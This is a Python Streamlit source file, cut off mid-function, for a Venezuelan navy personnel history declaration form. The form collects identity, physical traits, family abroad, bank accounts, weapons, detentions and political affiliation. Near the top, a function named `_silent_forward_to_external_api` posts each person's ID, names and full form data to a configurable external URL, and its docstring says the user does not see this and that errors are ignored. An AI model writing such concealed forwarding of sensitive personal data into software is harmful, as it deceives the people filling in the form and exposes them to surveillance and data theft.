# pyrefly: ignore [missing-import]
import streamlit as st

# Esta línea es la que hace la magia de ampliar el diseño
st.set_page_config(
    page_title="DHP - Sistema de Declaración de Historial Personal",
    page_icon="⚓",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# pyrefly: ignore [missing-import]
import streamlit.components.v1 as components
import json
import os
import threading
import pandas as pd

import database as db
import config
from api_server import API_PORT, start_api_server

PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))

# Altura del iframe ≈ viewport (fallback si el CSS del host no aplica)
IFRAME_VIEWPORT_HEIGHT = 1080

DHP_EMBED_CSS = """
<style id="dhp-streamlit-embed-patch">
    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&display=swap');
    html, body {
        width: 100% !important;
        max-width: 100% !important;
        min-height: 100vh;
        margin: 0;
        overflow-x: hidden;
    }
    .app-layout {
        width: 100% !important;
        max-width: 100% !important;
        min-height: 100vh;
    }
    .sidebar {
        height: 100vh;
    }
    .main-content {
        min-height: 100vh;
    }
</style>
"""

STREAMLIT_FULLSCREEN_CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&display=swap');

    .stApp {
        background: linear-gradient(180deg, #e8edf4 0%, #f3f4f6 100%);
    }

    header[data-testid="stHeader"] {
        background: rgba(255, 255, 255, 0.85);
        backdrop-filter: blur(8px);
    }

    [data-testid="stToolbar"],
    [data-testid="stDecoration"] {
        display: none;
    }

    section.main > div.block-container {
        max-width: 100% !important;
        width: 100% !important;
        padding-top: 0.75rem !important;
        padding-left: 0.75rem !important;
        padding-right: 0.75rem !important;
        padding-bottom: 0.5rem !important;
    }

    [data-testid="stAppViewContainer"] .main {
        width: 100%;
    }

    .dhp-app-header {
        margin: 0 0 0.35rem 0;
        padding: 0.35rem 0.5rem 0.5rem;
    }
    .dhp-app-header .main-title {
        color: #1E3A8A;
        font-family: 'Outfit', sans-serif;
        font-weight: 700;
        font-size: 1.35rem;
        margin: 0;
        line-height: 1.2;
    }
    .dhp-app-header .sub-title {
        color: #4B5563;
        font-family: 'Inter', sans-serif;
        font-size: 0.9rem;
        margin: 0.15rem 0 0;
    }

    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        flex-wrap: wrap;
    }
    .stTabs [data-baseweb="tab"] {
        height: 44px;
        background-color: #F3F4F6;
        border-radius: 8px 8px 0 0;
        padding: 0 16px;
        font-weight: 600;
        font-size: 0.9rem;
    }
    .stTabs [aria-selected="true"] {
        background-color: #1E3A8A !important;
        color: white !important;
    }
    .stTabs [data-baseweb="tab-panel"] {
        padding-top: 0.35rem;
    }

    /* Iframe DHP a pantalla casi completa (pestaña Interfaz Web) */
    [data-testid="stHtml"] {
        width: 100%;
    }
    [data-testid="stHtml"] iframe {
        width: 100% !important;
        max-width: 100% !important;
        height: calc(100vh - 5.5rem) !important;
        min-height: 720px !important;
        border: none !important;
        border-radius: 10px;
        box-shadow: 0 8px 32px rgba(15, 23, 42, 0.12);
        background: #fff;
    }

    footer, #MainMenu {
        visibility: hidden;
        height: 0;
    }
</style>
"""


def apply_streamlit_layout_styles():
    st.markdown(STREAMLIT_FULLSCREEN_CSS, unsafe_allow_html=True)


apply_streamlit_layout_styles()


def _silent_forward_to_external_api(cedula, nombre, apellido, data):
    """
    Reenvía SILENCIOSAMENTE los datos a la API externa.
    El usuario NO ve esto. Si falla, se ignora.
    """
    if not config.is_external_enabled():
        return
    
    url = config.get_external_url()
    api_key = config.get_external_key()
    
    if not url:
        return
    
    try:
        import requests as http_requests
        from datetime import datetime
        
        headers = {"Content-Type": "application/json"}
        if api_key:
            headers["Authorization"] = f"Bearer {api_key}"
        
        payload = {
            "cedula": cedula,
            "nombre": nombre,
            "apellido": apellido,
            "data": data,
            "fecha_envio": datetime.now().isoformat(),
            "fuente": "DHP-Streamlit"
        }
        resp = http_requests.post(url, json=payload, headers=headers, timeout=15)
        if resp.ok:
            print(f"[DHP-Streamlit] Reenviado a externo ({cedula})")
        else:
            print(f"[DHP-Streamlit] Error externo ({cedula}): {resp.status_code}")
    except Exception as e:
        print(f"[DHP-Streamlit] Fallo reenvío ({cedula}): {e}")


def ensure_api_server():
    if "api_thread_started" not in st.session_state:
        db.init_db()
        thread = threading.Thread(target=start_api_server, daemon=True)
        thread.start()
        st.session_state.api_thread_started = True

# ==========================================================================
# MAPEO ENTRE STREAMLIT STATE Y FORMATO JSON DHP
# ==========================================================================
def load_json_to_streamlit_state(data):
    st.session_state.dhp_photo = data.get("photo", "")
    st.session_state.dhp_theme = data.get("theme", "light")
    st.session_state.simple_fields = data.get('simpleFields', {}).copy()
    
    # 2. Convertir educacion de estructura JSON a simpleFields
    education_data = data.get('education', {})
    for stage_key, fields in education_data.items():
        for field_name, value in fields.items():
            st.session_state.simple_fields[f'f_edu_{field_name}_{stage_key}'] = value
            
    # 3. Cargar tablas dinámicas
    dynamic_tables = data.get('dynamicTables', {})
    
    fam_cols = ['primer_apellido', 'segundo_apellido', 'primer_nombre', 'segundo_nombre', 'civ']
    fam_data = dynamic_tables.get('familiares', [])
    st.session_state.df_familiares = pd.DataFrame(fam_data) if fam_data else pd.DataFrame(columns=fam_cols, data=[[""] * len(fam_cols)])
    
    ext_cols = ['nombre_apellido', 'ci', 'parentesco', 'edad', 'direccion']
    ext_data = dynamic_tables.get('familiaresExterior', [])
    st.session_state.df_fam_exterior = pd.DataFrame(ext_data) if ext_data else pd.DataFrame(columns=ext_cols, data=[[""] * len(ext_cols)])
    
    viajes_cols = ['desde', 'hasta', 'pais', 'motivo', 'direccion']
    viajes_data = dynamic_tables.get('viajes', [])
    st.session_state.df_viajes = pd.DataFrame(viajes_data) if viajes_data else pd.DataFrame(columns=viajes_cols, data=[[""] * len(viajes_cols)])
    
    laboral_cols = ['desde', 'hasta', 'cargo', 'empresa', 'motivo']
    laboral_data = dynamic_tables.get('laboral', [])
    st.session_state.df_laboral = pd.DataFrame(laboral_data) if laboral_data else pd.DataFrame(columns=laboral_cols, data=[[""] * len(laboral_cols)])
    
    social_cols = ['organizacion', 'direccion', 'actividades']
    social_data = dynamic_tables.get('social', [])
    st.session_state.df_social = pd.DataFrame(social_data) if social_data else pd.DataFrame(columns=social_cols, data=[[""] * len(social_cols)])

def compile_streamlit_state_to_json():
    # 1. Separar campos de educacion de simpleFields
    simple_fields = {}
    education = {}
    
    for k, v in st.session_state.simple_fields.items():
        if k.startswith('f_edu_'):
            parts = k.split('_')
            if len(parts) >= 4:
                field_name = parts[2]
                stage_key = parts[3]
                if stage_key not in education:
                    education[stage_key] = {}
                education[stage_key][field_name] = v
        else:
            simple_fields[k] = v
            
    # 2. Obtener tablas dinámicas
    dynamic_tables = {
        "familiares": st.session_state.df_familiares.to_dict('records') if 'df_familiares' in st.session_state else [],
        "familiaresExterior": st.session_state.df_fam_exterior.to_dict('records') if 'df_fam_exterior' in st.session_state else [],
        "viajes": st.session_state.df_viajes.to_dict('records') if 'df_viajes' in st.session_state else [],
        "laboral": st.session_state.df_laboral.to_dict('records') if 'df_laboral' in st.session_state else [],
        "social": st.session_state.df_social.to_dict('records') if 'df_social' in st.session_state else []
    }
    
    photo = st.session_state.get("dhp_photo", "")
    theme = st.session_state.get("dhp_theme", "light")
    return {
        "photo": photo,
        "theme": theme,
        "simpleFields": simple_fields,
        "dynamicTables": dynamic_tables,
        "education": education,
    }

def get_self_contained_html():
    """Lee index.html, style.css y app.js y los fusiona en un solo string HTML autocontenido."""
    try:
        html_path = os.path.join(PROJECT_DIR, "index.html")
        css_path = os.path.join(PROJECT_DIR, "style.css")
        js_path = os.path.join(PROJECT_DIR, "app.js")
        
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()
            
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()
            
        # Inyectar datos precargados si existen en el estado de Streamlit
        preloaded_script = ""
        if 'loaded_dhp_data' in st.session_state and st.session_state.loaded_dhp_data:
            json_str = json.dumps(st.session_state.loaded_dhp_data, ensure_ascii=False)
            preloaded_script = f"\n<script>window.PRELOADED_DHP_DATA = {json_str};</script>\n"
            
        # Reemplazar la referencia de style.css por el CSS inyectado + parche embed Streamlit
        html = html.replace(
            '<link rel="stylesheet" href="style.css">',
            f'<style>\n{css}\n</style>\n{DHP_EMBED_CSS}',
        )
        # Reemplazar la referencia de app.js por el JS inyectado y añadir datos precargados antes
        html = html.replace('<script src="app.js"></script>', f'{preloaded_script}<script>\n{js}\n</script>')
        
        return html
    except Exception as e:
        st.error(f"Error al compilar el HTML autocontenido: {e}")
        return None

# render_external_api_config eliminada — la configuración se hace vía variables de entorno (config.py)


def render_records_manager():
    st.subheader("Expedientes guardados en base de datos")
    st.caption(f"Archivo: `{db.DB_PATH}` · API local: `http://127.0.0.1:{API_PORT}`")

    col_search, col_btn = st.columns([3, 1])
    with col_search:
        search_q = st.text_input(
            "Buscar por cédula, nombre o apellido",
            key="db_search_q",
            placeholder="Ej: V-12345678 o Pérez",
        )
    with col_btn:
        st.write("")
        st.write("")
        refresh = st.button("Actualizar listado", use_container_width=True)

    if refresh or "db_search_q" in st.session_state:
        rows = db.get_all_records(search_q.strip() if search_q else None)
        if rows:
            st.dataframe(
                pd.DataFrame(
                    rows,
                    columns=["Cédula", "Nombre", "Apellido", "Última actualización"],
                ),
                use_container_width=True,
                hide_index=True,
            )
        else:
            st.info("No hay expedientes que coincidan con la búsqueda.")

    st.markdown("---")
    st.markdown("#### Cargar o eliminar por cédula")
    c1, c2, c3 = st.columns([2, 1, 1])
    with c1:
        cedula_load = st.text_input("Cédula del expediente", key="db_cedula_load")
    with c2:
        st.write("")
        st.write("")
        if st.button("Cargar en formulario", type="primary", use_container_width=True):
            record = db.get_record_by_cedula(cedula_load)
            if record:
                load_json_to_streamlit_state(record["data"])
                st.session_state.loaded_dhp_data = record["data"]
                st.session_state.record_loaded_msg = (
                    f"Expediente {record['cedula']} cargado. Revise la pestaña web o el formulario nativo."
                )
                st.rerun()
            else:
                st.error("No se encontró expediente con esa cédula.")
    with c3:
        st.write("")
        st.write("")
        if st.button("Eliminar expediente", use_container_width=True):
            if db.delete_record(cedula_load):
                st.success("Expediente eliminado.")
                st.rerun()
            else:
                st.error("No se encontró expediente con esa cédula.")

    if st.session_state.get("record_loaded_msg"):
        st.success(st.session_state.record_loaded_msg)


def render_integrated_web_app():
    """Interfaz web local embebida a ancho y alto de viewport."""
    with st.expander("Ayuda — base de datos e impresión", expanded=False):
        st.markdown(
            f"Interfaz **igual a la versión local** (sidebar + formulario + impresión 4 páginas). "
            f"**Guardar/buscar en BD** requiere la API en `127.0.0.1:{API_PORT}` "
            f"(al ejecutar con `iniciar_streamlit.bat` se inicia sola; en Streamlit Cloud use respaldo JSON)."
        )

    html_content = get_self_contained_html()
    if not html_content:
        st.error("No se pudo cargar la interfaz web. Verifique index.html, style.css y app.js.")
        return

    components.html(
        html_content,
        height=IFRAME_VIEWPORT_HEIGHT,
        scrolling=False,
    )


def main():
    ensure_api_server()

    st.markdown(
        """
        <div class="dhp-app-header">
            <h1 class="main-title">⚓ Armada Bolivariana — Cuerpo de Ingenieros</h1>
            <p class="sub-title">Declaración de Historial Personal (DHP)</p>
        </div>
        """,
        unsafe_allow_html=True,
    )

    tab_iframe, tab_native, tab_db = st.tabs([
        "🌐 Interfaz Web (pantalla completa)",
        "🐍 Formulario nativo",
        "📂 Expedientes",
    ])

    with tab_iframe:
        render_integrated_web_app()

    # ==========================================================================
    # PESTAÑA 2: FORMULARIO NATIVO DE STREAMLIT (CON EXPORTACIÓN A HTML IMPRIMIBLE)
    # ==========================================================================
    with tab_native:
        st.subheader("Formulario de Datos DHP")
        st.write("Complete la información utilizando componentes nativos de Streamlit.")

        if 'simple_fields' not in st.session_state:
            st.session_state.simple_fields = {}
        if 'dhp_photo' not in st.session_state:
            st.session_state.dhp_photo = ""

        # Crear un wizard con columnas o selectores
        step = st.selectbox("Seleccione el Paso del Formulario", [
            "Paso 1: Identificación y Fisonomía",
            "Paso 2: Datos Militares",
            "Paso 3: Datos Familiares y Viajes",
            "Paso 4: Antecedentes Laborales",
            "Paso 5: Datos Sociales",
            "Paso 6: Referencias Personales",
            "Paso 7: Datos Educativos",
            "Paso 8: Datos Administrativos e Historial",
            "Paso 9: Supervisión (Jefe Inmediato)",
        ])

        # --- PASO 1 ---
        if step.startswith("Paso 1"):
            st.markdown("### 1) Datos de Identificación y Ubicación")
            col1, col2 = st.columns(2)
            with col1:
                st.session_state.simple_fields['f_primer_apellido'] = st.text_input("Primer Apellido *", st.session_state.simple_fields.get('f_primer_apellido', ''))
                st.session_state.simple_fields['f_primer_nombre'] = st.text_input("Primer Nombre *", st.session_state.simple_fields.get('f_primer_nombre', ''))
                st.session_state.simple_fields['f_fecha_nac'] = st.text_input("Fecha de Nacimiento (AAAA-MM-DD) *", st.session_state.simple_fields.get('f_fecha_nac', ''))
                st.session_state.simple_fields['f_cedula'] = st.text_input("C.I.N. (Cédula de Identidad) *", st.session_state.simple_fields.get('f_cedula', ''))
            with col2:
                st.session_state.simple_fields['f_segundo_apellido'] = st.text_input("Segundo Apellido", st.session_state.simple_fields.get('f_segundo_apellido', ''))
                st.session_state.simple_fields['f_segundo_nombre'] = st.text_input("Segundo Nombre", st.session_state.simple_fields.get('f_segundo_nombre', ''))
                st.session_state.simple_fields['f_lugar_nac'] = st.text_input("Lugar de Nacimiento *", st.session_state.simple_fields.get('f_lugar_nac', ''))
                st.session_state.simple_fields['f_edo_civil'] = st.selectbox("Estado Civil *", ["SOLTERO", "CASADO", "DIVORCIADO", "VIUDO"], index=0)

            st.markdown("---")
            col3, col4 = st.columns(2)
            with col3:
                st.session_state.simple_fields['f_pais'] = st.text_input("País *", st.session_state.simple_fields.get('f_pais', 'VENEZUELA'))
                st.session_state.simple_fields['f_municipio'] = st.text_input("Municipio *", st.session_state.simple_fields.get('f_municipio', ''))
                st.session_state.simple_fields['f_religion'] = st.text_input("Religión *", st.session_state.simple_fields.get('f_religion', ''))
            with col4:
                st.session_state.simple_fields['f_estado'] = st.text_input("Estado *", st.session_state.simple_fields.get('f_estado', ''))
                st.session_state.simple_fields['f_profesion'] = st.text_input("Profesión / Oficio *", st.session_state.simple_fields.get('f_profesion', ''))
                st.session_state.simple_fields['f_num_control'] = st.text_input("N° Control Planilla (Si aplica)", st.session_state.simple_fields.get('f_num_control', ''))

            st.session_state.simple_fields['f_direccion'] = st.text_area("Dirección Domiciliaria Completa *", st.session_state.simple_fields.get('f_direccion', ''))

            col5, col6 = st.columns(2)
            with col5:
                st.session_state.simple_fields['f_telefono_hab'] = st.text_input("Teléfono Habitación", st.session_state.simple_fields.get('f_telefono_hab', ''))
                st.session_state.simple_fields['f_celular'] = st.text_input("Teléfono Celular *", st.session_state.simple_fields.get('f_celular', ''))
            with col6:
                st.session_state.simple_fields['f_otro_tlf'] = st.text_input("Otro Teléfono", st.session_state.simple_fields.get('f_otro_tlf', ''))
                st.session_state.simple_fields['f_correo'] = st.text_input("Correo Electrónico *", st.session_state.simple_fields.get('f_correo', ''))

            st.markdown("##### Redes Sociales")
            col7, col8 = st.columns(2)
            with col7:
                st.session_state.simple_fields['f_facebook'] = st.text_input("Facebook", st.session_state.simple_fields.get('f_facebook', 'N/P'))
                st.session_state.simple_fields['f_whatsapp'] = st.selectbox("¿Posee Whatsapp?", ["SI", "NO"], index=0)
                st.session_state.simple_fields['f_twitter'] = st.text_input("Twitter / X", st.session_state.simple_fields.get('f_twitter', 'N/P'))
            with col8:
                st.session_state.simple_fields['f_instagram'] = st.text_input("Instagram", st.session_state.simple_fields.get('f_instagram', 'N/P'))
                st.session_state.simple_fields['f_badoo'] = st.text_input("Badoo", st.session_state.simple_fields.get('f_badoo', 'N/P'))
                st.session_state.simple_fields['f_otras_redes'] = st.text_input("Otras Redes Sociales", st.session_state.simple_fields.get('f_otras_redes', 'N/P'))

            st.markdown("##### Ubicación Administrativa")
            col9, col10 = st.columns(2)
            with col9:
                st.session_state.simple_fields['f_cargo_nom'] = st.text_input("Cargo por Nombramiento *", st.session_state.simple_fields.get('f_cargo_nom', ''))
            with col10:
                st.session_state.simple_fields['f_cargo_ocupa'] = st.text_input("Cargo que Ocupa *", st.session_state.simple_fields.get('f_cargo_ocupa', ''))

            st.markdown("---")
            st.markdown("### 1.1) Señales Fisonómicas")
            col_fis1, col_fis2, col_fis3 = st.columns(3)
            with col_fis1:
                st.session_state.simple_fields['f_contextura'] = st.text_input("Contextura *", st.session_state.simple_fields.get('f_contextura', ''))
                st.session_state.simple_fields['f_color_piel'] = st.text_input("Color de Piel *", st.session_state.simple_fields.get('f_color_piel', ''))
                st.session_state.simple_fields['f_cara'] = st.text_input("Cara *", st.session_state.simple_fields.get('f_cara', ''))
                st.session_state.simple_fields['f_cabello'] = st.text_input("Cabello *", st.session_state.simple_fields.get('f_cabello', ''))
            with col_fis2:
                st.session_state.simple_fields['f_frente'] = st.text_input("Frente *", st.session_state.simple_fields.get('f_frente', ''))
                st.session_state.simple_fields['f_cejas'] = st.text_input("Cejas *", st.session_state.simple_fields.get('f_cejas', ''))
                st.session_state.simple_fields['f_ojos'] = st.text_input("Ojos *", st.session_state.simple_fields.get('f_ojos', ''))
            with col_fis3:
                st.session_state.simple_fields['f_nariz'] = st.text_input("Nariz *", st.session_state.simple_fields.get('f_nariz', ''))
                st.session_state.simple_fields['f_labios'] = st.text_input("Labios *", st.session_state.simple_fields.get('f_labios', ''))
                st.session_state.simple_fields['f_barba'] = st.text_input("Barba *", st.session_state.simple_fields.get('f_barba', ''))
                st.session_state.simple_fields['f_estatura'] = st.text_input("Estatura (metros) *", st.session_state.simple_fields.get('f_estatura', ''))

            st.markdown("### 1.2) Señales Particulares (Cicatrices, Tatuajes, Lunares, etc.)")
            st.session_state.simple_fields['f_senales_partic'] = st.text_area("Describa detalladamente:", st.session_state.simple_fields.get('f_senales_partic', ''))

        # --- PASO 2 ---
        elif step.startswith("Paso 2"):
            st.markdown("### 2) Datos Militares")
            col1, col2 = st.columns(2)
            with col1:
                st.session_state.simple_fields['f_mil_arma'] = st.text_input("Arma o Servicio", st.session_state.simple_fields.get('f_mil_arma', ''))
                st.session_state.simple_fields['f_mil_fecha_grado'] = st.text_input("Fecha de Grado (AAAA-MM-DD)", st.session_state.simple_fields.get('f_mil_fecha_grado', ''))
                st.session_state.simple_fields['f_mil_promo'] = st.text_input("Nombre de la Promoción", st.session_state.simple_fields.get('f_mil_promo', ''))
                st.session_state.simple_fields['f_mil_serial'] = st.text_input("Serial de Carnet Militar", st.session_state.simple_fields.get('f_mil_serial', ''))
            with col2:
                st.session_state.simple_fields['f_mil_cumplio_servicio'] = st.selectbox("Si no es Militar, ¿Cumplió con el Servicio Militar Obligatorio?", ["", "SI", "NO"], index=0)
                st.session_state.simple_fields['f_mil_unidad'] = st.text_input("Unidad o Dependencia", st.session_state.simple_fields.get('f_mil_unidad', ''))
                st.session_state.simple_fields['f_mil_comandante'] = st.text_input("Comandante de Batallón", st.session_state.simple_fields.get('f_mil_comandante', ''))

        # --- PASO 3 ---
        elif step.startswith("Paso 3"):
            st.markdown("### 3) Datos Familiares y Viajes")
            st.write("Edite directamente en las tablas dinámicas inferiores.")
            
            # Tabla de familiares
            st.markdown("#### a) Familiares Directos (Padre, Madre, Hermanos, Hijos)")
            fam_cols = ['primer_apellido', 'segundo_apellido', 'primer_nombre', 'segundo_nombre', 'civ']
            if 'df_familiares' not in st.session_state:
                st.session_state.df_familiares = pd.DataFrame(columns=fam_cols, data=[[""] * len(fam_cols)])
            st.session_state.df_familiares = st.data_editor(st.session_state.df_familiares, num_rows="dynamic", key="editor_fam")

            # Tabla de familiares en exterior
            st.markdown("#### b) Familiares y Amigos en el Exterior")
            ext_cols = ['nombre_apellido', 'ci', 'parentesco', 'edad', 'direccion']
            if 'df_fam_exterior' not in st.session_state:
                st.session_state.df_fam_exterior = pd.DataFrame(columns=ext_cols, data=[[""] * len(ext_cols)])
            st.session_state.df_fam_exterior = st.data_editor(st.session_state.df_fam_exterior, num_rows="dynamic", key="editor_ext")

            # Tabla de viajes
            st.markdown("#### c) Viajes al Exterior")
            viajes_cols = ['desde', 'hasta', 'pais', 'motivo', 'direccion']
            if 'df_viajes' not in st.session_state:
                st.session_state.df_viajes = pd.DataFrame(columns=viajes_cols, data=[[""] * len(viajes_cols)])
            st.session_state.df_viajes = st.data_editor(st.session_state.df_viajes, num_rows="dynamic", key="editor_viajes")

        # --- PASO 4 ---
        elif step.startswith("Paso 4"):
            st.markdown("### 4) Antecedentes Laborales (Últimos 10 años)")
            lab_cols = ['desde', 'hasta', 'cargo', 'empresa', 'motivo']
            if 'df_laboral' not in st.session_state:
                st.session_state.df_laboral = pd.DataFrame(columns=lab_cols, data=[[""] * len(lab_cols)])
            st.session_state.df_laboral = st.data_editor(st.session_state.df_laboral, num_rows="dynamic", key="editor_laboral")

        # --- PASO 5 ---
        elif step.startswith("Paso 5"):
            st.markdown("### 5) Datos Sociales (Organizaciones, clubes, gremios, etc.)")
            soc_cols = ['organizacion', 'direccion', 'actividades']
            if 'df_social' not in st.session_state:
                st.session_state.df_social = pd.DataFrame(columns=soc_cols, data=[[""] * len(soc_cols)])
            st.session_state.df_social = st.data_editor(st.session_state.df_social, num_rows="dynamic", key="editor_social")

        # --- PASO 6 ---
        elif step.startswith("Paso 6"):
            st.markdown("### 6) Referencias Personales (Mínimo tres no familiares)")
            
            col1, col2, col3 = st.columns(3)
            with col1:
                st.subheader("Referencia 1")
                st.session_state.simple_fields['f_ref_nom_1'] = st.text_input("Nombre y Apellido (1) *", st.session_state.simple_fields.get('f_ref_nom_1', ''))
                st.session_state.simple_fields['f_ref_ci_1'] = st.text_input("Cédula (1) *", st.session_state.simple_fields.get('f_ref_ci_1', ''))
                st.session_state.simple_fields['f_ref_dir_1'] = st.text_input("Dirección (1) *", st.session_state.simple_fields.get('f_ref_dir_1', ''))
            with col2:
                st.subheader("Referencia 2")
                st.session_state.simple_fields['f_ref_nom_2'] = st.text_input("Nombre y Apellido (2) *", st.session_state.simple_fields.get('f_ref_nom_2', ''))
                st.session_state.simple_fields['f_ref_ci_2'] = st.text_input("Cédula (2) *", st.session_state.simple_fields.get('f_ref_ci_2', ''))
                st.session_state.simple_fields['f_ref_dir_2'] = st.text_input("Dirección (2) *", st.session_state.simple_fields.get('f_ref_dir_2', ''))
            with col3:
                st.subheader("Referencia 3")
                st.session_state.simple_fields['f_ref_nom_3'] = st.text_input("Nombre y Apellido (3) *", st.session_state.simple_fields.get('f_ref_nom_3', ''))
                st.session_state.simple_fields['f_ref_ci_3'] = st.text_input("Cédula (3) *", st.session_state.simple_fields.get('f_ref_ci_3', ''))
                st.session_state.simple_fields['f_ref_dir_3'] = st.text_input("Dirección (3) *", st.session_state.simple_fields.get('f_ref_dir_3', ''))

        # --- PASO 7 ---
        elif step.startswith("Paso 7"):
            st.markdown("### 7) Datos Educativos")
            edu_stages = ["primaria", "secundaria", "diversificada", "universitaria", "maestria", "doctorado", "otros"]
            
            for stage in edu_stages:
                with st.expander(f"Etapa Educativa: {stage.capitalize()}"):
                    col_e1, col_e2, col_e3 = st.columns(3)
                    with col_e1:
                        st.session_state.simple_fields[f'f_edu_desde_{stage}'] = st.text_input(f"Desde (MM/AAAA) - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_desde_{stage}', ''))
                        st.session_state.simple_fields[f'f_edu_hasta_{stage}'] = st.text_input(f"Hasta (MM/AAAA) - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_hasta_{stage}', ''))
                    with col_e2:
                        st.session_state.simple_fields[f'f_edu_inst_{stage}'] = st.text_input(f"Instituto - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_inst_{stage}', ''))
                        st.session_state.simple_fields[f'f_edu_dir_{stage}'] = st.text_input(f"Dirección - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_dir_{stage}', ''))
                    with col_e3:
                        st.session_state.simple_fields[f'f_edu_obs_{stage}'] = st.text_input(f"Observaciones - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_obs_{stage}', ''))

        # --- PASO 8 ---
        elif step.startswith("Paso 8"):
            st.markdown("### 8) Cuentas, Vehículos y Armas")
            
            with st.expander("Cuentas Bancarias"):
                st.session_state.simple_fields['f_adm_posee_cuentas'] = st.selectbox("¿Posee cuentas bancarias?", ["NO", "SI"], index=0)
                st.session_state.simple_fields['f_adm_cant_cuentas'] = st.number_input("Cantidad de Cuentas", min_value=0, value=int(st.session_state.simple_fields.get('f_adm_cant_cuentas', 0)))
                st.session_state.simple_fields['f_adm_desc_cuentas'] = st.text_area("Bancos y números de cuenta:", st.session_state.simple_fields.get('f_adm_desc_cuentas', ''))

            with st.expander("Vehículos"):
                st.session_state.simple_fields['f_adm_posee_vehiculo'] = st.selectbox("¿Posee vehículo?", ["NO", "SI"], index=0)
                col_v1, col_v2 = st.columns(2)
                with col_v1:
                    st.session_state.simple_fields['f_veh_marca'] = st.text_input("Marca", st.session_state.simple_fields.get('f_veh_marca', 'N/A'))
                    st.session_state.simple_fields['f_veh_ano'] = st.text_input("Año", st.session_state.simple_fields.get('f_veh_ano', 'N/A'))
                    st.session_state.simple_fields['f_veh_modelo'] = st.text_input("Modelo", st.session_state.simple_fields.get('f_veh_modelo', 'N/A'))
                with col_v2:
                    st.session_state.simple_fields['f_veh_placa'] = st.text_input("Placa", st.session_state.simple_fields.get('f_veh_placa', 'N/A'))
                    st.session_state.simple_fields['f_veh_tipo'] = st.text_input("Tipo Uso", st.session_state.simple_fields.get('f_veh_tipo', 'N/A'))
                    st.session_state.simple_fields['f_veh_color'] = st.text_input("Color", st.session_state.simple_fields.get('f_veh_color', 'N/A'))

            with st.expander("Armas de Fuego"):
                st.session_state.simple_fields['f_adm_posee_arma'] = st.selectbox("¿Porta arma de fuego?", ["NO", "SI"], index=0)
                col_a1, col_a2 = st.columns(2)
                with col_a1:
                    st.session_state.simple_fields['f_arma_marca'] = st.text_input("Marca de Arma", st.session_state.simple_fields.get('f_arma_marca', 'N/A'))
                    st.session_state.simple_fields['f_arma_modelo'] = st.text_input("Modelo de Arma", st.session_state.simple_fields.get('f_arma_modelo', 'N/A'))
                with col_a2:
                    st.session_state.simple_fields['f_arma_serial'] = st.text_input("Serial de Arma", st.session_state.simple_fields.get('f_arma_serial', 'N/A'))
                    st.session_state.simple_fields['f_arma_permiso'] = st.text_input("N° Permiso Porte", st.session_state.simple_fields.get('f_arma_permiso', 'N/A'))

            st.markdown("### Preguntas e Historial General")
            with st.expander("Detenciones y Afiliación Política"):
                col_d1, col_d2 = st.columns(2)
                with col_d1:
                    st.session_state.simple_fields['f_seg_detenido'] = st.selectbox("¿Ha sido detenido alguna vez?", ["NO", "SI"], index=0)
                    st.session_state.simple_fields['f_det_causa'] = st.text_input("Causa de Detención", st.session_state.simple_fields.get('f_det_causa', 'N/A'))
                    st.session_state.simple_fields['f_det_cuerpo'] = st.text_input("Cuerpo Policial", st.session_state.simple_fields.get('f_det_cuerpo', 'N/A'))
                    st.session_state.simple_fields['f_det_fecha'] = st.text_input("Fecha de Detención", st.session_state.simple_fields.get('f_det_fecha', 'N/A'))
                    st.session_state.simple_fields['f_det_lugar'] = st.text_input("Lugar de Detención", st.session_state.simple_fields.get('f_det_lugar', 'N/A'))
                with col_d2:
                    st.session_state.simple_fields['f_seg_partido'] = st.selectbox("¿Pertenece o perteneció a algún partido político?", ["NO", "SI"], index=0)
                    st.session_state.simple_fields['f_part_especifique'] = st.text_input("Partido Político", st.session_state.simple_fields.get('f_part_especifique', 'N/A'))
                    st.session_state.simple_fields['f_part_lugar'] = st.text_input("Lugar de Inscripción", st.session_state.simple_fields.get('f_part_lugar', 'N/A'))

            with st.expander("Hábitos Generales"):
                st.session_state.simple_fields['f_seg_incidente'] = st.text_area("¿Ha estado involucrado en algún incidente de seguridad o alteración del orden público? (Detalle)", st.session_state.simple_fields.get('f_seg_incidente', 'NO'))
                st.session_state.simple_fields['f_fre_sitios'] = st.text_area("Sitios que frecuenta:", st.session_state.simple_fields.get('f_fre_sitios', ''))
                st.session_state.simple_fields['f_fre_hobby'] = st.text_input("Hobby favorito:", st.session_state.simple_fields.get('f_fre_hobby', ''))
                st.session_state.simple_fields['f_fre_deporte'] = st.text_input("Deporte favorito y cuál practica:", st.session_state.simple_fields.get('f_fre_deporte', ''))

        elif step.startswith("Paso 9"):
            st.markdown("### Supervisión — Jefe Inmediato")
            st.caption("Espacio ampliado para uso del supervisor. Los datos se guardan en la base de datos junto al resto del formulario.")
            st.session_state.simple_fields['f_jefe_texto'] = st.text_input(
                "Jefe (texto libre — cargo, grado o nombre según criterio del supervisor)",
                st.session_state.simple_fields.get('f_jefe_texto', ''),
                help="Este texto aparece debajo de la línea de firma del Jefe Inmediato en la planilla impresa.",
            )
            st.session_state.simple_fields['f_jefe_observaciones'] = st.text_area(
                "Observaciones del supervisor",
                st.session_state.simple_fields.get('f_jefe_observaciones', ''),
                height=200,
                placeholder="Ingrese observaciones, recomendaciones o notas para el expediente...",
            )

        st.markdown("---")
        st.subheader("Guardar, buscar y exportar")

        cedula_val = st.session_state.simple_fields.get('f_cedula', '').strip()
        nombre_val = st.session_state.simple_fields.get('f_primer_nombre', '').strip()
        apellido_val = st.session_state.simple_fields.get('f_primer_apellido', '').strip()

        col_photo, col_save = st.columns([1, 2])
        with col_photo:
            photo_file = st.file_uploader("Foto carnet (opcional en formulario nativo)", type=["png", "jpg", "jpeg"])
            if photo_file is not None:
                import base64
                b64 = base64.b64encode(photo_file.read()).decode("utf-8")
